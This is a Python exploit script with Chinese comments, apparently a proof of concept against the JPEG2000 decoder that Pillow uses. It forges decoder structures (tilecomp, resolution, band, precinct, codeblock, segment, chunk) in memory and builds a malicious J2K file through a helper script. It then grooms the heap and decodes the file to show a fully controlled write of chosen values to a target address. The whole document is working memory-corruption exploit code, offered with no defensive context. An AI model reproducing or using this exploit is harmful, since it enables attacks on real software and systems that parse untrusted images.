#!/usr/bin/env python3
# 路线B：伪造完整 codeblock 树 => cblk->chunks[0].data 指向我们自己的压缩段
#         段来自 Pillow 用 num_resolutions=1 编码的 16 位图 => 系数 = 我们的样本
#         解码器 t1 还原后写入 fake_tilecomp.data（我们指定）=> 内容完全可控
import ctypes, gc, io, os, struct, subprocess, sys
from PIL import Image

R = lambda a: ctypes.c_uint64.from_address(a).value


def W(a, v):
    ctypes.c_uint64.from_address(a).value = v & 0xFFFFFFFFFFFFFFFF


def W32(a, v):
    ctypes.c_uint32.from_address(a).value = v & 0xFFFFFFFF


def Wf(a, v):
    ctypes.c_float.from_address(a).value = v


def alloc(n):
    """>=512B 的 bytearray（glibc、低地址、地址可表达）"""
    b = bytearray(n)
    return b, ctypes.addressof((ctypes.c_char * n).from_buffer(b))


# ---- staging 必须最先分配（否则堆长高 => 地址不可表达）----
stage = bytearray(16384)
STAGE = ctypes.addressof((ctypes.c_char * 16384).from_buffer(stage))
SENT = 0xA5
scr = bytearray(8192)
for i in range(8192):
    scr[i] = SENT
SCRATCH = ctypes.addressof((ctypes.c_char * 8192).from_buffer(scr))
print("[*] SCRATCH=%#x" % SCRATCH)

# ---------- 1) payload：16x16 I;16，num_resolutions=1 => 系数=样本 ----------
SAMPLES = [0x1122, 0x3344, 0x5566, 0x7788] + [0] * 252
im = Image.new('I;16', (16, 16))
im.putdata(SAMPLES)
buf = io.BytesIO()
im.save(buf, 'JPEG2000', num_resolutions=1)
PAY = buf.getvalue()
print("[*] payload 编码 %d 字节" % len(PAY))
# 校验无损往返
im2 = Image.open(io.BytesIO(PAY)); im2.load()
got = list(im2.getdata())
print("[*] 往返一致 =", got[:4] == SAMPLES[:4], [hex(v) for v in got[:4]])

# 找 SOD 之后的 tile-part 数据（段 = SOD 之后，前面可能还有 packet header）
sod = PAY.rfind(b'\xff\x93')
print("[*] SOD @ %d, 之后可用 %d 字节" % (sod, len(PAY) - sod - 2))

SEGADDR = STAGE + 0x1000
for off in range(2, 12):
    stage[0x1000:0x1100] = PAY[sod + off:sod + off + 256].ljust(256, bytes(1))
    print("    offset+%d 首字节: %s" % (off, bytes(stage[0x1000:0x1006]).hex()))

# 先用 offset=2 试（SOD+2 = 数据起始）
SEGLEN = min(256, len(PAY) - sod - 2)
stage[0x1000:0x1000+SEGLEN] = PAY[sod + 2:sod + 2 + SEGLEN]
print("[*] 段缓冲=%#x len=%d" % (SEGADDR, SEGLEN))

# ---------- 2) 伪造整棵树 ----------
TC = STAGE + 0x000   # tilecomp
RS = STAGE + 0x200   # resolutions[1]
BD = STAGE + 0x400   # bands[1]
PR = STAGE + 0x600   # precincts[1]
CB = STAGE + 0x800   # cblks[1]
SG = STAGE + 0xA00   # segs[1]
CH = STAGE + 0xC00   # chunks[1]
print("[*] TC=%#x RS=%#x BD=%#x PR=%#x CB=%#x SG=%#x CH=%#x" % (TC, RS, BD, PR, CB, SG, CH))
if max(TC, RS, BD, PR, CB, SG, CH, SEGADDR, SCRATCH) >= 0x1000000:
    print("[!] 有地址不可表达"); sys.exit(1)

# tilecomp
W32(TC + 0x10, 0)                 # compno
W32(TC + 0x14, 1)                 # numresolutions = 1
W32(TC + 0x18, 1)                 # minimum_num_resolutions
W(TC + 0x20, RS)                  # resolutions
W32(TC + 0x28, 40)                # resolutions_size
W(TC + 0x30, SCRATCH)             # ★ data -> 我们的目标
W32(TC + 0x38, 0)                 # ownsData = 0
W(TC + 0x40, 4096)
W(TC + 0x48, 4096)
W32(TC + 0x70, 256)               # numpix
# resolution[0]
W32(RS + 0x00, 0); W32(RS + 0x04, 0)
W32(RS + 0x08, 16); W32(RS + 0x0c, 16)
W32(RS + 0x10, 1); W32(RS + 0x14, 1)      # pw, ph
W32(RS + 0x18, 1)                          # numbands = 1
W(RS + 0x20, BD)                           # bands
# band[0]
W32(BD + 0x00, 0); W32(BD + 0x04, 0)
W32(BD + 0x08, 16); W32(BD + 0x0c, 16)
W32(BD + 0x10, 0)                          # bandno = 0 (LL)
W(BD + 0x18, PR)                           # precincts
W32(BD + 0x20, 56)                         # precincts_data_size
W32(BD + 0x24, 8)                          # numbps
Wf(BD + 0x28, 1.0)                         # stepsize
# precinct[0]
W32(PR + 0x00, 0); W32(PR + 0x04, 0)
W32(PR + 0x08, 16); W32(PR + 0x0c, 16)
W32(PR + 0x10, 1); W32(PR + 0x14, 1)       # cw=1, ch=1
W(PR + 0x18, CB)                           # cblks.dec
W32(PR + 0x20, 88)                         # block_size
# cblk[0]
W(CB + 0x00, SG)                           # segs
W(CB + 0x08, CH)                           # chunks
W32(CB + 0x10, 0); W32(CB + 0x14, 0)
W32(CB + 0x18, 16); W32(CB + 0x1c, 16)
W32(CB + 0x20, 8)                          # Mb
W32(CB + 0x24, 8)                          # numbps
W32(CB + 0x28, 3)                          # numlenbits
W32(CB + 0x2c, 1)                          # numnewpasses
W32(CB + 0x30, 1)                          # numsegs
W32(CB + 0x34, 1)                          # real_num_segs
W32(CB + 0x38, 1)                          # m_current_max_segs
W32(CB + 0x3c, 1)                          # numchunks
W32(CB + 0x40, 1)                          # numchunksalloc
W(CB + 0x48, 0)                            # decoded_data
W32(CB + 0x50, 0)                          # corrupted = 0
# seg[0]
W32(SG + 0x00, SEGLEN)                     # len
W32(SG + 0x04, 1)                          # numpasses
W32(SG + 0x08, 1)                          # real_num_passes
W32(SG + 0x0c, 1)                          # maxpasses
W32(SG + 0x10, 1)                          # numnewpasses
W32(SG + 0x14, SEGLEN)                     # newlen
# chunk[0]
W(CH + 0x00, SEGADDR)                      # ★ data -> 我们的压缩段
W32(CH + 0x08, SEGLEN)

# ---------- 3) 恶意文件：4-tile base + TLM/parts，A = TC-0x0c ----------
A = TC - 0x0c
B = A + 0x1000
C = A + 0x4000
r = subprocess.run(['python3', '/tmp/mk13.py', '/tmp/exp/base.j2k', '/tmp/F3.j2k', '0', '23',
                    hex(A), hex(B), hex(C), '-370'], capture_output=True, text=True)
print("[*] build:", (r.stdout + r.stderr).strip()[:70])
if 'OK' not in r.stdout:
    sys.exit(1)

# ---------- 4) groom + 解码 ----------
def groom_and_decode(path, tries=6):
    for _ in range(tries):
        gc.collect()
        prime = [bytes(519) for _ in range(1024)]
        del prime
        pairs = [(bytes(519), bytes(bytearray(519))) for _ in range(400)]
        good = [(D, Bb) for (D, Bb) in pairs if id(Bb) - id(D) == 0x230]
        if not good:
            del pairs
            continue
        ng = len(good)
        keep = [t2 for i, t2 in enumerate(good) if i != len(good) // 2]
        Ks2 = [Bb for (D, Bb) in keep]
        holeD = good[len(good) // 2][0]
        del holeD, pairs, good
        gc.collect()
        M = open(path, 'rb').read()
        try:
            im = Image.open(io.BytesIO(M)); im.load()
            return (im.size, ng)
        except BaseException as e:
            return ("ERR %r" % (e,), ng)
    return (None, 0)


res, ng = groom_and_decode('/tmp/F3.j2k')
print("[*] 解码=%s 相邻对=%d" % (res, ng))
same = sum(1 for i in range(8192) if scr[i] == SENT)
print("[*] scratch 未改动字节 = %d / 8192" % same)
if same < 8192:
    print("[+] scratch 前 32 字节:", bytes(scr[:32]).hex())
    print("[+] 期望样本(LE int32):", b''.join(struct.pack('<I', s & 0xFFFFFFFF) for s in SAMPLES[:4]).hex())
    hit = bytes(scr[:16]) == b''.join(struct.pack('<I', s) for s in SAMPLES[:4])
    print("[+] 内容精确匹配 =", hit)
    if hit:
        print("\n★★★ 路线B成立：伪造 codeblock 树 ⇒ 解码内容 100% 可控（精确样本值）")